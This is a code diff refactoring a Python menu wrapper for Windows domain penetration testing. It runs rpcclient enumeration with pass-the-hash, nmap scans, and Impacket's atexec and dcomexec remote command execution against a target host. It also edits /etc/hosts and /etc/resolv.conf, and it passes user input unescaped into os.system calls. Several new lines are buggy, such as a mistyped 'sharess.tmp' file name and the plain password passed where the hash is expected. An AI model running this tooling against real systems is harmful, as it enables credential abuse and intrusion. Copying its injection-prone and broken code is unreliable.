@@ -50,7 +50,7 @@ if os.geteuid() != 0:
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-colour1 = "yellow"
+colour1 = "yellow"					# SYSTEM COLOURS
 colour2 = "green"
 colour3 = "white"
 colour4 = "red"
@@ -60,14 +60,16 @@ colour7 = "cyan"
 colour8 = "white"
 colour9 = "black"
 
-network = "tun0"	# LOCAL NETWORK
-workdir = "MASTER"	# WORKING DIRECTORY
+network = "tun0"					# LOCAL NETWORK
+workdir = "MASTER"					# WORKING DIRECTORY
 
-splashs = 1		# SPLASH SCREEN ON/OFF
-bughunt = 0		# BUG HUNT ON/OFF
-maximum = 5000		# MAX USERS - NOTE NOT UNLIMITED
+splashs = 1						# SPLASH SCREEN ON/OFF
+bughunt = 0						# BUG HUNT ON/OFF
+maximum = 5000						# MAX USERS - NOTE NOT LIMITED TO 5000
 
-keypath = "python3 /usr/share/doc/python3-impacket/examples/"
+scriptr = "python3"					# PYTHON VERSION
+impacke = "/usr/share/doc/python3-impacket/examples/"	# IMPACKET LOCATION
+keypath = scriptr + " " + impacke			# FULL COMMAND
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -77,10 +79,12 @@ keypath = "python3 /usr/share/doc/python3-impacket/examples/"
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-os.system("ip a s " + network + " | awk '/inet/ {print $2}' > localip.tmp")
-localip = linecache.getline("localip.tmp",1)
-localip = localip.rstrip("\n")
-localip,null = localip.split("/")
+os.system("ip a s " + network + " | awk '/inet/ {print $2}' > localIP.tmp")
+with open("localIP.tmp", "r") as read:
+   line = read.readline()
+   line = line.rstrip("\n")
+   localIP,null = line.split("/")
+read.close()
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -90,14 +94,31 @@ localip,null = localip.split("/")
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-def padding(variable,value):
+def testOne(value):
+   value = 0
+   if TIP[:5] == "EMPTY":
+      print("[-] REMOTE IP has not been specified...")
+      value = 1
+   return(value)
+   
+def testTwo(value):
+   value = 0
+   if TIP[:5] == "EMPTY":
+      print("[-] REMOTE IP has not been specified...")
+      value = 1
+   if DOM[:5] == "EMPTY":
+      print("[-] DOMAIN NAME has not been specified...")
+      value = 1
+   return(value)  
+
+def spacePadding(variable,value):
    variable = variable.rstrip("\n")
    variable = variable[:value]
    while len(variable) < value:
       variable += " "
    return variable
 
-def dpadding(variable,value):
+def dotPadding(variable,value):
    test = variable
    variable = variable.rstrip("\n")
    variable = variable[:value] 
@@ -108,40 +129,39 @@ def dpadding(variable,value):
          variable += "."
    return variable
 
-def rpadding(variable,value):
-   while len(variable) < value:
-      temp = variable
-      variable = "." + temp
-   return variable
-
-def gettime(value):
+def getTime(value):
    variable = str(datetime.datetime.now().time())
    variable = variable.split(".")
    variable = variable[0]
    variable = variable.split(":")
    variable = variable[0] + ":" + variable[1]
-   variable = padding(variable, value)
+   variable = spacePadding(variable, value)
    return variable
 
-def command(command):
+def command(variable):
    if bughunt == 1:
-      print(colored(command, colour3))
-   os.system(command)
+      print(colored(variable, colour3))
+   os.system(variable)
    return
  
 def prompt():
    selection = input("\nPress ENTER to continue...")
    return   
 
-def cleanusers():
+def cleanUsers():
    for x in range (0, maximum):
       USER[x] = " "*COL3
       PASS[x] = " "*COL4
    return
    
-def cleanshares():
+def cleanShares():
    for x in range(0, maximum):
       SHAR[x] = " "*COL2
+   return
+   
+def cleanTokens():
+   for x in range(0, maximum):
+      VALD[x] = 0
    return
 
 def display():
@@ -417,8 +437,8 @@ print("               BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)      
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-print("\n[*] Booting - Please wait...")
-print("[+] Using localhost IP address " + localip + "...")
+print("\n[*] Booting program, please wait...")
+print("[+] Using localhost IP address " + localIP + "...")
 
 if not os.path.exists(workdir):
    os.mkdir(workdir)
@@ -450,16 +470,22 @@ if not os.path.exists("shares.txt"):
 else:
    print("[-] File shares.txt already exists...")		# DEFUALT SHARES LIST
    
+if not os.path.exists("token.txt"):
+   command("touch token.txt")
+   print("[+] File token.txt created...")
+else:
+   print("[-] File token.txt already exists...")		# DEFUALT TOKEN LIST
+   
 print("[+] Populating system variables...")
 
-SKEW = 0         	# TIME SKEW
-DOMC = 0		# DOMAIN COUNTER
-DNSC = 0		# DNS COUNTER
-COL1 = 40	 	# SESSIONS
-COL2 = 44	 	# SHARE NAMES
-COL3 = 23	 	# USER NAMES
-COL4 = 32	 	# HASHED PASSWORDS
-IP46 = "-4"		# IP TYPE
+SKEW = 0         		# TIME SKEW
+DOMC = 0			# DOMAIN COUNTER
+DNSC = 0			# DNS COUNTER
+COL1 = 40	 		# SESSIONS
+COL2 = 44	 		# SHARE NAMES
+COL3 = 23	 		# USER NAMES
+COL4 = 32	 		# HASHED PASSWORDS
+IP46 = "-4"			# IP TYPE
 
 SHAR = [" "*COL2]*maximum	# SHARE NAMES
 USER = [" "*COL3]*maximum	# USER NAMES
@@ -505,29 +531,32 @@ else:
    
    for x in range (0, maximum):
       USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-      USER[x] = padding(USER[x], COL3)
+      USER[x] = spacePadding(USER[x], COL3)
       
    for x in range (0, maximum):
       PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
-      PASS[x] = padding(PASS[x], COL4)
+      PASS[x] = spacePadding(PASS[x], COL4)
 
    for x in range(0, maximum):
       SHAR[x] = linecache.getline("shares.txt",x + 1).rstrip(" ")
       SHAR[x] = SHAR[x].lstrip()
-      SHAR[x] = padding(SHAR[x], COL2)
+      SHAR[x] = spacePadding(SHAR[x], COL2)
+      
+   for x in range(0, maximum):
+      VALD[x] = linecache.getline("token.txt",x + 1).rstrip(" ")
 
-if len(DNS) < COL1: DNS = padding(DNS, COL1)
-if len(TIP) < COL1: TIP = padding(TIP, COL1)
-if len(POR) < COL1: POR = padding(POR, COL1)
-if len(WEB) < COL1: WEB = padding(WEB, COL1)
-if len(USR) < COL1: USR = padding(USR, COL1)
-if len(PAS) < COL1: PAS = padding(PAS, COL1)
-if len(NTM) < COL1: NTM = padding(NTM, COL1)
-if len(DOM) < COL1: DOM = padding(DOM, COL1)
-if len(SID) < COL1: SID = padding(SID, COL1)
-if len(TSH) < COL1: TSH = padding(TSH, COL1)
-if len(LTM) < COL1: LTM = padding(LTM, COL1)
-if len(DIR) < COL1: DIR = padding(DIR, COL1)
+if len(DNS) < COL1: DNS = spacePadding(DNS, COL1)
+if len(TIP) < COL1: TIP = spacePadding(TIP, COL1)
+if len(POR) < COL1: POR = spacePadding(POR, COL1)
+if len(WEB) < COL1: WEB = spacePadding(WEB, COL1)
+if len(USR) < COL1: USR = spacePadding(USR, COL1)
+if len(PAS) < COL1: PAS = spacePadding(PAS, COL1)
+if len(NTM) < COL1: NTM = spacePadding(NTM, COL1)
+if len(DOM) < COL1: DOM = spacePadding(DOM, COL1)
+if len(SID) < COL1: SID = spacePadding(SID, COL1)
+if len(TSH) < COL1: TSH = spacePadding(TSH, COL1)
+if len(LTM) < COL1: LTM = spacePadding(LTM, COL1)
+if len(DIR) < COL1: DIR = spacePadding(DIR, COL1)
 
 if DOM[:5] != "EMPTY":
    command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
@@ -537,7 +566,9 @@ if":" in TIP:
    IP46 = "-6"
 
 if splashs == 1:
-   time.sleep( 5 )
+   time.sleep(5)
+   
+checkParams = 0
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -552,7 +583,7 @@ while True:
    linecache.clearcache()
    linecache.checkcache(filename=None)
    command("clear")
-   LTM = gettime(COL1)
+   LTM = getTime(COL1)
    display()
    options()
    selection=input("[*] Please Select: ")
@@ -566,132 +597,153 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='0':   
-      checkParams = 0
-
-      if (TIP[:5] == "EMPTY"):
-         print("[-] Remote IP address not specified...")
-#         checkParams = 1
+      checkParams = testOne(checkParams)
 
       if checkParams != 1:
-         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
-         line1 = linecache.getline("lsaquery.tmp", 1)
+         print("[i] Using HASH value as password credential...")
+         if NTM != "EMPTY":
+            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
+         else:
+            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
+                    
+         with open("lsaquery.tmp", "r") as read:
+            line1 = read.readline()
          
-         if (line1[:6] == "Cannot") or (line1[:1] == "") or "ACCESS_DENIED" in line1:
-            print(colored("[!] WARNING!!! - Unable to connect to RPC data...",'red'))
-            checkParams = 1
-         else:
-            print("[*] Attempting to enumerate domain name...")
+            if (line1[:6] == "Cannot") or (line1[:1] == "") or "ACCESS_DENIED" in line1:
+               print(colored("[!] WARNING!!! - Unable to connect to RPC data...",'red'))
+               checkParams = 1
+                              
+# ------------------------------------------------------------------------------------- 
             
-      if checkParams != 1:
-         DOM = " "*COL1					# WE HAVE CONNECTION SO
-         SID = " "*COL1					# WIPE CLEAN CURRENT VALUES
-         try:
-            null,DOM = line1.split(":")
-         except ValueError:
-            DOM = "EMPTY"
+            if checkParams != 1:
+               print("[*] Attempting to enumerate domain name...")
+               DOM = " "*COL1						# WIPE CURRENT VALUES
+               SID = " "*COL1
+            try:
+               null,DOM = line1.split(":")
+            except ValueError:
+               DOM = "EMPTY"
             
-      if checkParams != 1:                  
-         DOM = DOM.strip(" ")					# CLEAN UP DATA
-         if len(DOM) < COL1: DOM = padding(DOM, COL1)
+               DOM = DOM.strip(" ")					# CLEAN UP DATA
+               if len(DOM) < COL1: DOM = spacePadding(DOM, COL1)
                   
-         if DOM[:5] == "EMPTY":
-           print("[-] Unable to enumerate domain name...")
-         else:
-            print("[+] Found domain...\n")
-            print(colored(DOM,colour2))
+               if DOM[:5] == "EMPTY":
+                 print("[-] Unable to enumerate domain name...")
+               else:
+                  print("[+] Found domain...\n")
+                  print(colored(DOM,colour2))
             
-            if DOMC == 1:
-               print("\n[*] Resetting current domain association...")
-               command("sed -i '$d' /etc/hosts")
-               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
-               print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
-            else:
-               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
-               print("\n[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
-               DOMC = 1
+                  if DOMC == 1:
+                     print("\n[*] Resetting current domain association...")
+                     command("sed -i '$d' /etc/hosts")
+                     command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+                     print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
+                  else:
+                     command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+                     print("\n[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
+                     DOMC = 1
                      
 # ------------------------------------------------------------------------------------- 
 
-         print("[*] Attempting to enumerate domain SID...")
-         line2 = linecache.getline("lsaquery.tmp", 2)
+            print("[*] Attempting to enumerate domain SID...")
+            line2 = read.readline()
                      
-         try:
-            null,SID = line2.split(":")
-         except ValueError:
-            SID = "EMPTY"    
+            try:
+               null,SID = line2.split(":")
+            except ValueError:
+               SID = "EMPTY"    
                
-         SID = SID.strip(" ")				# CLEAN UP DATA
-         SID = padding(SID, COL1)              
+            SID = SID.strip(" ")				# CLEAN UP DATA
+            SID = spacePadding(SID, COL1)              
          
-         if SID[:5] == "EMPTY":
-            print("[-] Unable to enumerate domain SID...")
-         else:
-            print("[+] Found SID...\n")
-            print(colored(SID,colour2) + "\n")
-                 
+            if SID[:5] == "EMPTY":
+               print("[-] Unable to enumerate domain SID...")
+            else:
+               print("[+] Found SID...\n")
+               print(colored(SID,colour2) + "\n")
+         read.close()
+         
 # ------------------------------------------------------------------------------------- 
           
          print("[*] Attempting to enumerate shares...")
-         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares1.tmp")
+         if NTM != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
+         else:
+            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
+         
+         with open("shares.tmp", "r") as read:
+            line1 = read.readline()
+         read.close()
   
-         line3 = linecache.getline("shares1.tmp", 1)
-         if (line3[:9] == "Could not") or (line3[:6] == "Cannot") or (line3[:1] == "") or "ACCESS_DENIED" in line3:
+         if (line1[:9] == "Could not") or (line1[:6] == "Cannot") or (line1[:1] == "") or "ACCESS_DENIED" in line1:
             print("[-] Unable to enumerate shares...")
          else:
-            cleanshares()						# WIPE CURRENT SHARE VALUES
+            cleanShares()						# WIPE CURRENT SHARE VALUES
 
-            command("sed -i -n '/netname: /p' shares1.tmp")		# TIDY UP FILE FOR READING
-            command("sed -i '/^$/d' shares1.tmp")
-            command("cat shares1.tmp | sort > shares2.tmp")
+            command("sed -i -n '/netname: /p' shares.tmp")		# TIDY UP FILE FOR READING 
+            command("sed -i '/^$/d' shares.tmp")
+            command("cat sharess.tmp | sort > sshares.tmp")
                         
-            count = len(open('shares2.tmp').readlines())
+            count = len(open('sshares.tmp').readlines())
             if count != 0:
                print("[+] Found shares...\n")
-               for x in range(0, count):
-                  SHAR[x] = linecache.getline("shares2.tmp", x + 1)
-                  SHAR[x] = SHAR[x].replace(" ","")
-                  try:
-                     null, SHAR[x] = SHAR[x].split(":")
-                  except ValueError:
-                     SHAR[x] = "Error..."
-                  print(colored(SHAR[x].rstrip("\n"),colour2))
-                  if len(SHAR[x]) < COL2: SHAR[x] = dpadding(SHAR[x], COL2)
-               print("")
+               with open("sshares.tmp") as read:
+                  for x in range(0, count):
+                     SHAR[x]  = read.readline()
+                     SHAR[x] = SHAR[x].replace(" ","")
+                     try:
+                        null, SHAR[x] = SHAR[x].split(":")
+                     except ValueError:
+                        SHAR[x] = "Error..."
+                     print(colored(SHAR[x].rstrip("\n"),colour2))
+                     SHAR[x] = dotPadding(SHAR[x], COL2)
+                  print("")
+               read.close()
                   
 # ------------------------------------------------------------------------------------- 
      
-         print("[*] Attempting to enumerate domain users...")          
-         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers1.tmp")      
+         print("[*] Attempting to enumerate domain users...")              
 
-         line4 = linecache.getline("domusers1.tmp", 1)
-         if (line4[:9] == "Could not") or (line4[:6] == "result") or (line4[:6] == "Cannot") or (line4[:1] == "") or "ACCESS_DENIED" in line4:
+         if NTM != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
+         else:
+            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
+
+         with open("domusers.tmp","r") as read:
+            line1 = read.readline()
+         read.close()
+
+         if (line1[:9] == "Could not") or (line1[:6] == "result") or (line1[:6] == "Cannot") or (line1[:1] == "") or "ACCESS_DENIED" in line1:
             print("[-] Unable to enumerate domain users...")
          else:
-            cleanusers()							# WIPE CLEAN USERS AND PASSWORDS             
-            os.remove("usernames.txt")						# PURGE CURRENT USERFILE LIST            
-            command("touch usernames.txt")					# CREATE NEW USERFILE LIST   
-                     
-            command("cat domusers1.tmp | sort > domusers2.tmp")			# TIDY NEW USER FILE FOR READING
-            command("sed -i '/^$/d' domusers2.tmp")
+            cleanUsers()							# WIPE CLEAN USERS AND PASSWORDS             
             
-            count2 = len(open('domusers2.tmp').readlines()) 
+            os.remove("usernames.txt")						# PURGE CURRENT USERFILE LIST
+            command("cat domusers.tmp | sort > sdomusers.tmp")			# TIDY NEW USER FILE FOR READING
+            command("sed -i '/^$/d' sdomusers.tmp")
+            
+            count2 = len(open('sdomusers.tmp').readlines()) 
+            
             if count2 != 0:
                print ("[+] Found users...\n")
-               for x in range(0, count2):
-                  line5 = linecache.getline("domusers2.tmp", x + 1)
-                  try:
-                     null,USER[x],null2 = line5.split(":");
-                  except ValueError:
-                     USER[x] = "Error..."
-                  USER[x] = USER[x].replace("[","")
-                  USER[x] = USER[x].replace("]","")
-                  USER[x] = USER[x].replace("rid","")
-                  if USER[x][:5] != "Error":
-                     print(colored(USER[x],colour2))
-                  if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-                  command("echo " + USER[x] + " >> usernames.txt")
-      
-      command("rm *.tmp")
+               with open("sdomusers.tmp", "r") as read:
+                  for x in range(0, count2):
+                     line2 = read.readline()
+                     try:
+                        null1,USER[x],null2 = line2.split(":");
+                     except ValueError:
+                        USER[x] = "Error..."
+                     USER[x] = USER[x].replace("[","")
+                     USER[x] = USER[x].replace("]","")
+                     USER[x] = USER[x].replace("rid","")
+                     if USER[x][:5] != "Error":
+                        print(colored(USER[x],colour2))
+                        
+                     USER[x] = spacePadding(USER[x], COL3)
+                     command("echo " + USER[x] + " >> usernames.txt")
+               read.close()       
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -709,18 +761,19 @@ while True:
       if DNS == "":
          DNS = BAK
       else:
-         if len(DNS) < COL1:
-            DNS = padding(DNS, COL1)
+         DNS = spacePadding(DNS, COL1)
          if DNSC == 1:
             print("\n[+] Resetting current DNSERVER IP association...")
             command("sed -i '$d' /etc/resolv.conf")
             DNS = "EMPTY"
-            DNS = padding(DOM, COL1)
+            DNS = spacePadding(DOM, COL1)
             DNSC = 0
+
          if DNS[:5] != "EMPTY":
             command("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
             print("[+] DNSERVER IP " + DNS.rstrip(" ") + " has been added to /etc/resolv.conf...")
             DNSC = 1
+
          if":" in TIP:
             print("[*] Defaulting to IP 6...")
             IP46 = "-6"
@@ -744,13 +797,12 @@ while True:
       if TIP == "":
          TIP = BAK
       else:
-         if len(TIP) < COL1:
-            TIP = padding(TIP, COL1)
+         TIP = spacePadding(TIP, COL1)
          if DOMC == 1:
             print("[+] Resetting current domain association...")
             command("sed -i '$d' /etc/hosts")
             DOM = "EMPTY"
-            DOM = padding(DOM, COL1)
+            DOM = spacePadding(DOM, COL1)
             DOMC = 0
 
          if DOM[:5] != "EMPTY":
@@ -765,6 +817,8 @@ while True:
             print("[*] Defualting to IP 4...")
             IP46 = "-4"
             
+         print("[i] Identifying network interfaces...\n")
+         
          authLevel = RPC_C_AUTHN_LEVEL_NONE
          stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")
          rpctransport = transport.DCERPCTransportFactory(stringBinding)
@@ -772,9 +826,7 @@ while True:
          portmap.set_auth_level(authLevel)
          portmap.connect()
          objExporter = IObjectExporter(portmap)
-         bindings = objExporter.ServerAlive2()
-         
-         print("[*] Identifying network interfaces...\n")
+         bindings = objExporter.ServerAlive2()         
 
          for binding in bindings:
              NetworkAddr = binding['aNetworkAddr']
@@ -796,7 +848,7 @@ while True:
 
       if POR != "":
          if len(POR) < COL1:
-            POR = padding(POR, COL1)
+            POR = spacePadding(POR, COL1)
          else:
             POR = POR.rstrip("\n")
       else:
@@ -816,7 +868,7 @@ while True:
 
       if WEB != "":
          if len(WEB) < COL1:
-            WEB = padding(WEB, COL1)
+            WEB = spacePadding(WEB, COL1)
       else:
          WEB = BAK
          
@@ -835,13 +887,13 @@ while True:
       if USR == "":
          USR = BAK
       else:
-         if len(USR) < COL1: USR = padding(USR, COL1)
+         USR = spacePadding(USR, COL1)
          for x in range(0, maximum):
             if USER[x].rstrip(" ") == USR.rstrip(" "):
-               NTM = PASS[x] # UPDATE HASH VALUE TO MATCH USER.
+               NTM = PASS[x] 			# UPDATE HASH VALUE TO MATCH NEW USER.
                if NTM[:1] == "":
                   NTM = "''"
-               NTM = padding(NTM, COL1)
+               NTM = spacePadding(NTM, COL1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -857,7 +909,7 @@ while True:
 
       if PAS != "":
          if len(PAS) < COL1:
-            PAS = padding(PAS, COL1)
+            PAS = spacePadding(PAS, COL1)
       else:
          PAS = BAK
 
@@ -875,7 +927,7 @@ while True:
 
       if NTM != "":
          if len(NTM) < COL1:
-            NTM = padding(NTM, COL1)
+            NTM = spacePadding(NTM, COL1)
       else:
          NTM = BAK
 
@@ -893,7 +945,7 @@ while True:
 
       if DOM != "":
          if len(DOM) < COL1:
-            DOM = padding(DOM, COL1)
+            DOM = spacePadding(DOM, COL1)
          if DOMC == 1:
             print("[+] Removing previous domain name from /etc/hosts...")
             command("sed -i '$d' /etc/hosts")
@@ -919,7 +971,7 @@ while True:
 
       if SID != "":
          if len(SID) < COL1:
-            SID = padding(SID, COL1)
+            SID = spacePadding(SID, COL1)
       else:
          SID = BAK
 
@@ -937,7 +989,7 @@ while True:
 
       if TSH != "":
          if len(TSH) < COL1:
-            TSH = padding(TSH,COL1)
+            TSH = spacePadding(TSH,COL1)
       else:
          TSH = BAK
 
@@ -955,7 +1007,7 @@ while True:
 
       if LTM != "":
          command("date --set=" + LTM)
-         LTM = padding(LTM, COL1)
+         LTM = spacePadding(LTM, COL1)
          SKEW = 1
       else:
          LTM = BAK      
@@ -978,10 +1030,12 @@ while True:
          if len(newDirectory) > 0:
             os.mkdir(newDirectory)
             DIR = newDirectory
+            
             if len(DIR) < COL1:
-               DIR = padding(DIR, COL1)
+               DIR = spacePadding(DIR, COL1)
             print("[+] Working directory changed...")
             print("[*] Checking to see if the old directory can be safely deleted...")
+            
             if len(os.listdir(oldDirectory)) == 0:
                os.rmdir(oldDirectory)
                print("[+] Old directory succesfully deleted...")
@@ -1017,8 +1071,8 @@ while True:
       if DNS[:5] != "EMPTY":
          command("fierce -dns " + DNS.rstrip(" "))
       else:
-         print("\n[-] DNS server has not been specified...")
-      prompt()      
+         print("[-] DNS server has not been specified...")
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1029,16 +1083,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '15':
-      checkParams = 0
-
-      if (DOM[:5] == "EMPTY"):
-         print("\n[-] Domain name not specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         checkParams = 1
-         
+      checkParams = testTwo(checkParams)
+               
       if USR[:2] == "''":
          print("\n[-] Username has not been specified...")
          checkParams = 1
@@ -1062,25 +1108,25 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '16':
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-      else:
-         print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
-         command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
-         POR = linecache.getline("PORTS.tmp", 1)         
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
+            print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
+            command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
+            POR = linecache.getline("PORTS.tmp", 1)         
          
-         if len(POR) < COL1:
-            POR = padding(POR, COL1)
-         else:
-            POR = POR.rstrip("\n")           
+            if len(POR) < COL1:
+               POR = spacePadding(POR, COL1)
+            else:
+               POR = POR.rstrip("\n")           
 
-         if POR[:1] == "":
-            print("[-] Unable to enumerate any port information, good luck!!...")
-         else:
-            print("[+] Found live ports...\n")
-            print(colored(POR,colour2))
+            if POR[:1] == "":
+               print("[-] Unable to enumerate any port information, good luck!!...")
+            else:
+               print("[+] Found live ports...\n")
+               print(colored(POR,colour2))
         
-         prompt()
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1091,9 +1137,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '17':
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-      else:
+      checkParams = testOne(checkParams)
+  
+      if checkParams != 1:
          if POR[:5] != "EMPTY":
             print("[*] Scanning specified live ports only, please wait...")
             command("nmap " + IP46 + " -p " + POR.rstrip(" ") + " -sC -sV " + TIP.rstrip(" "))
@@ -1111,15 +1157,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '18':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
@@ -1134,11 +1172,11 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '19':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+
+      if checkParams != 1:
 #         command("nmap " + IP46 + " -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
          command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" "))
-      else:
-         print("\n[-] Remote IP address has not been specified...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1151,17 +1189,19 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '20':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+
+      if checkParams != 1:
          print("[*] Attempting to enumerate architecture...")
-         OS = "[-] Not found..."
-         command(keypath + "getArch.py -target " + TIP.rstrip(" ") + " > os.txt")
-         with open("os.txt") as search:
-            for line in search:
+         command(keypath + "getArch.py -target " + TIP.rstrip(" ") + " > os.tmp")
+         OS = "[-] Unable to identify architecture..."
+         with open("os.tmp") as read:
+            for line in read:
                if "is" in line:
-                  OS = line
                   print("[+] Found architecture...")
-         print(colored("\n" + OS,colour2))
-         command("rm os.txt")
+                  OS = line
+         read.close()
+         print(colored(OS,colour2))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1173,15 +1213,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='21':
-      checkParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command(keypath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
@@ -1196,15 +1228,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='22':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command(keypath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
@@ -1219,15 +1243,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '23':
-      checkParams = 0
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command(keypath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " whoami /all")
@@ -1242,15 +1258,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '24':
-      checkParams = 0
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
          
       if checkParams != 1:
          command(keypath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
@@ -1265,18 +1273,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-      checkParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
